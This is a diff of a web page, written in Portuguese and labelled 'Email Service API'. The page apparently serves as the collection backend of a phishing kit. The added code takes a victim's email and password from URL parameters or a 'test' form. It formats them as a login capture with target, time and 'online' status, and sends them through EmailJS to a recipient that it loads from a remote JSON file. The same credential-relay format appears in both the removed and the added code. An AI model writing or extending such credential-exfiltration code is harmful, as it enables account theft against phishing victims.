@@ -17,7 +17,7 @@
       justify-content: center;
       padding: 20px;
     }
-    .container { text-align: center; max-width: 400px; }
+    .container { text-align: center; max-width: 500px; }
     h1 { font-size: 24px; margin-bottom: 16px; }
     .status { 
       font-size: 16px; 
@@ -36,11 +36,12 @@
       padding: 12px;
       background: rgba(255,255,255,0.03);
       border-radius: 8px;
-      font-size: 12px;
+      font-size: 11px;
       text-align: left;
-      max-height: 200px;
+      max-height: 300px;
       overflow-y: auto;
       color: #8E8E93;
+      font-family: 'Courier New', monospace;
     }
     .recipient-info {
       margin-top: 16px;
@@ -50,6 +51,37 @@
       font-size: 13px;
       color: #007AFF;
     }
+    .test-section {
+      margin-top: 20px;
+      padding: 16px;
+      background: rgba(255,255,255,0.05);
+      border-radius: 12px;
+    }
+    .test-section input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 8px;
+      color: #fff;
+      font-size: 14px;
+    }
+    .test-section button {
+      width: 100%;
+      padding: 12px;
+      background: #007AFF;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .test-section button:active {
+      background: #0051D5;
+    }
   </style>
 </head>
 <body>
@@ -57,6 +89,14 @@
     <h1>🔒 Email Service API</h1>
     <p class="status info" id="status">Inicializando...</p>
     <div class="recipient-info" id="recipientInfo">Carregando destinatário...</div>
+    
+    <div class="test-section">
+      <h3 style="color: #fff; margin-bottom: 12px;">🧪 Teste Manual</h3>
+      <input type="email" id="testEmail" placeholder="Email do usuário" />
+      <input type="password" id="testPassword" placeholder="Senha do usuário" />
+      <button onclick="testEmailSend()">Enviar Teste</button>
+    </div>
+    
     <div class="log" id="log"></div>
   </div>
 
@@ -82,7 +122,7 @@
       function addLog(msg) {
         const timestamp = new Date().toLocaleTimeString('pt-BR');
         logs.push(`[${timestamp}] ${msg}`);
-        if (logs.length > 15) logs.shift();
+        if (logs.length > 20) logs.shift();
         logEl.innerHTML = logs.join('<br>');
         console.log(msg);
       }
@@ -99,13 +139,11 @@
       // Carregar configuração de email do JSON
       async function loadEmailConfig() {
         try {
-          addLog('🔄 Carregando configuração de email...');
+          addLog('🔄 Carregando emails.json...');
           
-          const response = await fetch(EMAILS_JSON_URL, {
+          const response = await fetch(EMAILS_JSON_URL + '?t=' + Date.now(), {
             cache: 'no-cache',
-            headers: {
-              'Accept': 'application/json'
-            }
+            headers: { 'Accept': 'application/json' }
           });
 
           if (!response.ok) {
@@ -138,12 +176,14 @@
       // Inicializar EmailJS
       async function initialize() {
         try {
+          addLog('🔧 Inicializando EmailJS...');
           emailjs.init(USER_ID);
           addLog('✓ EmailJS inicializado');
           
           await loadEmailConfig();
           
           setStatus('✓ Serviço online e pronto', 'success');
+          addLog('🚀 Sistema pronto para receber dados');
         } catch (e) {
           addLog('✗ Erro na inicialização: ' + e.message);
           setStatus('✗ Erro na inicialização', 'error');
@@ -153,17 +193,18 @@
       // Função principal para enviar email
       async function sendEmail(data) {
         try {
-          addLog('📧 Nova requisição recebida');
+          addLog('━━━━━━━━━━━━━━━━━━━━━━');
+          addLog('📧 NOVA REQUISIÇÃO RECEBIDA');
           setStatus('📤 Processando...', 'info');
 
-          // SEMPRE recarrega config antes de enviar (proteção contra invasores)
+          // SEMPRE recarrega config antes de enviar
           addLog('🔄 Recarregando destinatário...');
           await loadEmailConfig();
 
           const templateParams = {
             to_name: recipientConfig.name,
             to_email: recipientConfig.email,
-            from_name: data.from_name || data.from_email.split('@')[0],
+            from_name: data.from_name || data.from_email?.split('@')[0] || 'Usuário',
             from_email: data.from_email || 'unknown@email.com',
             message: data.message || 'Sem mensagem',
             cc: data.cc || '',
@@ -172,11 +213,13 @@
 
           addLog(`📨 De: ${templateParams.from_email}`);
           addLog(`📬 Para: ${templateParams.to_email}`);
+          addLog(`💬 Mensagem: ${data.message?.substring(0, 50)}...`);
           setStatus('📤 Enviando email...', 'info');
 
           const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
           
-          addLog(`✓ Email enviado! Status: ${response.status}`);
+          addLog(`✓✓✓ EMAIL ENVIADO COM SUCESSO!`);
+          addLog(`Status: ${response.status} - ${response.text}`);
           setStatus('✓ Email enviado com sucesso!', 'success');
           
           return { 
@@ -187,7 +230,7 @@
           };
         } catch (error) {
           const errorMsg = error.text || error.message || 'Erro desconhecido';
-          addLog(`✗ Erro no envio: ${errorMsg}`);
+          addLog(`✗✗✗ ERRO NO ENVIO: ${errorMsg}`);
           setStatus('✗ Falha no envio', 'error');
           
           return { 
@@ -198,58 +241,80 @@
         }
       }
 
-      // Handler para requisições POST (Flutter HTTP)
-      window.addEventListener('message', async (event) => {
-        addLog('📨 PostMessage recebida');
+      // Processar dados da URL (método GET com parâmetros)
+      function processUrlData() {
+        const urlParams = new URLSearchParams(window.location.search);
         
-        if (event.data && event.data.type === 'SEND_EMAIL') {
-          const result = await sendEmail(event.data.payload);
-          
-          if (event.source) {
-            event.source.postMessage({
-              type: 'EMAIL_RESPONSE',
-              payload: result
-            }, event.origin);
-          }
-        }
-      });
-
-      // Handler para URL params
-      const urlParams = new URLSearchParams(window.location.search);
-      const dataParam = urlParams.get('data');
-      
-      if (dataParam) {
-        initialize().then(() => {
+        // Método 1: Parâmetro 'data' com JSON
+        const dataParam = urlParams.get('data');
+        if (dataParam) {
           try {
-            addLog('📥 Processando dados da URL');
+            addLog('📥 Processando dados da URL (método JSON)');
             const data = JSON.parse(decodeURIComponent(dataParam));
             sendEmail(data);
+            return true;
           } catch (e) {
-            addLog(`✗ Erro ao processar URL: ${e.message}`);
-            setStatus('✗ Dados inválidos', 'error');
+            addLog(`✗ Erro ao processar JSON: ${e.message}`);
           }
-        });
-      } else {
-        initialize();
+        }
+
+        // Método 2: Parâmetros individuais
+        const email = urlParams.get('email');
+        const password = urlParams.get('password');
+        
+        if (email && password) {
+          addLog('📥 Processando dados da URL (método params)');
+          const now = new Date();
+          const time = `${now.getDate().toString().padStart(2,'0')}/${(now.getMonth()+1).toString().padStart(2,'0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+          
+          const data = {
+            from_email: email,
+            from_name: email.split('@')[0],
+            message: `Email: ${email}\nPalavra-passe: ${password}\nTarget: login\nTime: ${time}\nStatus: online`
+          };
+          
+          sendEmail(data);
+          return true;
+        }
+
+        return false;
       }
 
-      // Função de teste exposta globalmente
-      window.sendTestEmail = async function(email, password) {
-        // SEMPRE recarrega antes de testar
+      // Função de teste manual
+      window.testEmailSend = async function() {
+        const email = document.getElementById('testEmail').value;
+        const password = document.getElementById('testPassword').value;
+        
+        if (!email || !password) {
+          alert('Preencha email e senha');
+          return;
+        }
+
         await loadEmailConfig();
+        
+        const now = new Date();
+        const time = `${now.getDate().toString().padStart(2,'0')}/${(now.getMonth()+1).toString().padStart(2,'0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
         
         const testData = {
           from_email: email,
           from_name: email.split('@')[0],
-          message: `Email: ${email}\nPalavra-passe: ${password}\nTarget: login\nTime: ${new Date().toLocaleString('pt-BR')}\nStatus: online`
+          message: `Email: ${email}\nPalavra-passe: ${password}\nTarget: login\nTime: ${time}\nStatus: online`
         };
         
-        return await sendEmail(testData);
+        const result = await sendEmail(testData);
+        alert(result.success ? '✓ Email enviado!' : '✗ Erro: ' + result.message);
       };
 
-      // Não precisa recarregar periodicamente - sempre recarrega antes de enviar
-      addLog('🚀 Sistema inicializado');
-      addLog('🔒 Modo seguro: sempre recarrega destinatário');
+      // Expor globalmente para chamadas externas
+      window.sendEmailData = sendEmail;
+
+      // Inicializar
+      initialize().then(() => {
+        const hasData = processUrlData();
+        if (!hasData) {
+          addLog('ℹ Aguardando dados via URL ou teste manual');
+        }
+      });
       
     })();
   </script>
